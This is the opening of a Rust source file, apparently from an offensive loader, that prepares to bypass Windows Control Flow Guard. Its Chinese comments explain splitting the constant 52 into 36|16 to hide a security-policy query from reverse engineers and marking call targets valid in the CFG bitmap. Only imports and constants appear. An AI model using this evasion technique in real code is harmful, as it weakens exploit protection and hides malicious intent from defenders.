#![allow(unused)]

// cfg=control flow guard 安全机制



use core::{ffi::c_void,ptr::null_mut};
use crate::{debug_log,stealth_bail};
use obfstr::{obfcstr as s};
use puerto::winapis::{NtCurrentProcess,NT_SUCCESS};
use puerto::helper::PE;

use crate::config::Config;
use crate::winapis::{
    NtQueryInformationProcess,
    SetProcessValidCallTargets
};

use crate::types::{
    CFG_CALL_TARGET_INFO,
    EXTENDED_PROCESS_INFORMATION
};

/// flag indicating a valid indirect call target
/// 当调用SetProcessValidCallTargets去修改cfg位图bitmap时,需要传给内核一个CFG_CALL_TARGET_INFO结构体,其中有一个flags字段,该字段代表经bitmap中的bit置为1
const CFG_CALL_TARGET_VALID: usize = 1;

/// used internally by windows to identify per-process CFG state
/// 代码调用NtQueryInformationProcess查询进程的安全策略.该api的第二个参数是一个ProcessInformationClass的枚举值.为了查询安全缓解策略,系统规定必须传入枚举值52(对应  ProcessMitigationPolicy).但如果直接写 ProcessMitigationPolicy = 52被逆向的时候直接告诉对方这里在查询系统安全策略
/// 
/// 后续因该自己改变这两个做|运算的值,但要确保|后是52
const PROCESS_COOKIE: u32 = 36;
const PROCESS_USER_MODE_IOPL: u32 = 16;

/// mitigation policy id for cfg
/// 把52传给内核,表示要查询进程的mitigation policy环节策略.现代win有十几种(如aslr/dep等).PROCESS_MITIGATION_POLICY中的7就是cfg策略
/// 
/// 它被打包到一个结构体(申请表)中,这个结构体的内存地址(指针)作为第三个参数传给NtQueryInformationProcess
const ProcessControlFlowGuardPolicy: i32 = 7i32;













